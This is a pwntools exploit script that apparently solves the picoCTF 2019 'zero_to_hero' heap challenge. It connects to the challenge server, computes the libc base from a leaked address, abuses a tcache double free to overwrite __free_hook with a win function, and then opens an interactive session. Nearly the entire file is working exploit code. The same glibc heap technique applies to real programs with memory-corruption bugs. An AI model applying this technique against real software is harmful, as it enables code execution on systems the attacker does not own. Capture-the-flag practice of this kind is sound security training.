from pwn import *

e = ELF("./zero_to_hero")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.29.so")

context.binary = e
context.terminal = ["konsole", "-e"]

#p = process([ld.path, e.path], env={"LD_PRELOAD": libc.path})
p = remote("2019shell1.picoctf.com", 45180)


#context.log_level="debug"
#gdb.attach(p, """c""")
#break * 0x400d15""")


def add(l, d):
	print("add")
	p.sendlineafter("> ", "1")
	p.sendlineafter("> ", str(l))
	p.sendlineafter("> ", d)


def remove(idx):
	print("remove")
	p.sendlineafter("> ", "2")
	p.sendlineafter("> ", str(idx))


win = 0x400a02



p.sendlineafter("?", "y")


p.recvline()
p.recvline()
p.recvline()


dat = p.recvline().strip().split(" ")[-1]
#print("dat", dat)


libc.address = eval(dat) - 0x52fd0


print("libc base", hex(libc.address))
print("libc system", hex(libc.sym["system"]))



add(0xf8, "A")

add(0x128, "B")

add(0x20, "C")


remove(0)

remove(1)

add(0xf8, "A"*0xf8)

remove(1)


print("free hook", hex(libc.sym["__free_hook"]))

add(0xf8, p64(libc.sym["__free_hook"]))


add(0x120, "AA")
add(0x120, p64(win))


remove(3)



p.interactive()






